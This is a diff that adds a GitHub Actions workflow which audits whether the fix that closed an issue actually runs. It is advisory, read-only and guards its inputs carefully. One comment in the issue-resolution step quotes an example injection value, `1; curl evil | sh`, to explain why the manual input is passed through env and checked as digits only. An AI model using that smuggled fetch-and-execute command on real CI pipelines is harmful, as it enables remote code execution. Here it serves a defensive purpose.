@@ -1,0 +1,160 @@
+# Closure audit — does the fix that closed an issue actually run?
+#
+# HAND-WRITTEN, and the persona says why. `agents/personas/canary-batwoman.yaml`
+# declares this workflow's triggers and sets `outputs.ci-workflow: false`:
+# `harness persona sync-workflows` emits a job whose only step is
+# `npx harness <command>` under a pnpm install, and batwoman is a CANARY CLI
+# subcommand taking `--issue N`. Generating it would produce a workflow calling
+# a harness command that does not exist (proposal amendment BW-C3).
+#
+# The guard D8 wanted is kept anyway: `ts/test/batwoman-workflow-drift.test.ts`
+# asserts the triggers below still match the persona's. Change one without the
+# other and the suite fails.
+#
+# ADVISORY. Every step is `continue-on-error: true` and the job never fails a
+# build. Batwoman reports whether an artifact has run; it never asserts the fix
+# is correct, and a strict mode is deferred until the advisory volume has been
+# triaged — the precedent is dogfood.yml, which shipped advisory and ratcheted
+# afterwards.
+name: Batwoman
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+    inputs:
+      issue:
+        description: "Issue number to audit"
+        required: true
+        type: string
+
+permissions:
+  contents: read
+  issues: read
+  pull-requests: read
+  actions: read
+
+concurrency:
+  group: batwoman-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  audit:
+    name: Closure audit (advisory)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+          cache: npm
+          cache-dependency-path: ts/package-lock.json
+
+      - name: Build the engine
+        working-directory: ts
+        run: |
+          npm ci
+          npm run build
+
+      # On a manual run the issue is given. On a push it is derived from the
+      # merge commit's `Closes #N` / `Fixes #N` trailer -- the very keyword
+      # match batwoman exists to question, which is the right input precisely
+      # because it is what GitHub itself acted on.
+      #
+      # No issue found is NOT a failure: most merges close nothing. It is
+      # reported and skipped, with the reason named, rather than passing
+      # silently over an empty set.
+      - name: Resolve the issue to audit
+        id: resolve
+        continue-on-error: true
+        # `REQUESTED` comes in through `env`, never interpolated into the
+        # script body: a `workflow_dispatch` input is attacker-controlled text,
+        # and `${{ }}` inside `run:` is textual substitution, so a value like
+        # `1; curl evil | sh` would execute. It is also matched against
+        # `^[0-9]+$` before use -- an issue number is digits, and anything else
+        # is refused rather than sanitised.
+        env:
+          REQUESTED: ${{ github.event.inputs.issue }}
+        run: |
+          set -euo pipefail
+          if [ -n "${REQUESTED:-}" ]; then
+            if ! printf '%s' "$REQUESTED" | grep -qE '^[0-9]+$'; then
+              echo "Refusing a non-numeric issue input." >&2
+              echo "issue=" >> "$GITHUB_OUTPUT"
+              exit 0
+            fi
+            echo "issue=$REQUESTED" >> "$GITHUB_OUTPUT"
+            echo "Auditing issue #$REQUESTED (manual)."
+            exit 0
+          fi
+          subject=$(git log -1 --pretty=%B)
+          issue=$(printf '%s' "$subject" \
+            | grep -oiE '(close[sd]?|fix(e[sd])?|resolve[sd]?) #[0-9]+' \
+            | grep -oE '[0-9]+' | head -1 || true)
+          if [ -z "$issue" ]; then
+            echo "No closing keyword in this merge commit — nothing to audit."
+            echo "issue=" >> "$GITHUB_OUTPUT"
+          else
+            echo "issue=$issue" >> "$GITHUB_OUTPUT"
+            echo "Auditing issue #$issue, named by this merge commit."
+          fi
+
+      - name: Audit the closure
+        id: audit
+        if: steps.resolve.outputs.issue != ''
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_REPOSITORY: ${{ github.repository }}
+          ISSUE: ${{ steps.resolve.outputs.issue }}
+        run: node ts/bin/canary.js batwoman --issue "$ISSUE"
+
+      - name: Record the machine shape
+        id: machine
+        if: steps.resolve.outputs.issue != ''
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_REPOSITORY: ${{ github.repository }}
+          ISSUE: ${{ steps.resolve.outputs.issue }}
+        run: |
+          node ts/bin/canary.js batwoman \
+            --issue "$ISSUE" --json > batwoman-report.json
+
+      # `always()`, not success (#588): the run that FAILED is the one whose
+      # report someone needs. Uploading only on success hands you an artifact
+      # exactly when you did not need it.
+      - name: Upload the report
+        id: upload
+        if: always() && steps.resolve.outputs.issue != ''
+        continue-on-error: true
+        uses: actions/upload-artifact@v4
+        with:
+          name: batwoman-report
+          path: batwoman-report.json
+          if-no-files-found: warn
+
+      # Every soft step above is annotated (#718), each guarded on its OWN
+      # outcome. A `continue-on-error` step with nothing watching it turns the
+      # STEP orange and leaves the JOB green -- a failure that renders as a
+      # pass, which is the shape batwoman itself exists to catch. The guard
+      # has to sit in the `if:` expression, not inside the shell body: a
+      # condition the workflow parser can read is what makes the link
+      # checkable from outside.
+      - name: Say that the issue could not be resolved
+        if: steps.resolve.outcome == 'failure'
+        run: echo "::warning title=Batwoman::Could not resolve an issue to audit."
+
+      - name: Say that the audit did not complete
+        if: steps.audit.outcome == 'failure'
+        run: echo "::warning title=Batwoman::The closure audit did not complete."
+
+      - name: Say that the machine shape is missing
+        if: steps.machine.outcome == 'failure'
+        run: echo "::warning title=Batwoman::The machine-shape report was not produced."
+
+      - name: Say that the artifact did not upload
+        if: steps.upload.outcome == 'failure'
+        run: echo "::warning title=Batwoman::The report artifact was not uploaded."
